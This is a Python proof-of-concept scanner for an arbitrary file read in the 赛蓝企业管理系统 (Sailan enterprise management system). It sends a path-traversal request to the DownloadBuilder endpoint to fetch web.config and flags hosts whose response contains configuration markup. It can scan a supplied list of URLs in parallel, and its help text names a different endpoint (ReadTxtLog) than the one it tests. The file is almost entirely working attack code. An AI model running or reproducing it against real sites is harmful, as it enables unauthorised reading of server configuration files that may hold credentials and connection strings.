import requests, argparse, time, sys

requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool


def banner():
    test = """
  ______  ____ ____ 
 /_  /\ \/ / // / / 
  / /_ \  / _  / /__
 /___/ /_/_//_/____/

"""
    print(test)


def poc(target):
    payload = "/BaseModule/ReportManage/DownloadBuilder?filename=/../web.config"
    try:
        response = requests.get(target + payload, timeout=10, verify=False)
        if "<configuration>" in response.text:
            print(f"[+] {target} 存在赛蓝企业管理系统 DownloadBuilder 任意文件读取漏洞")
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"[-] {target} 可能存在问题")


def main():
    banner()
    parser = argparse.ArgumentParser(description=" 赛蓝企业管理系统 ReadTxtLog 任意文件读取漏洞")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")


if __name__ == '__main__':
    main()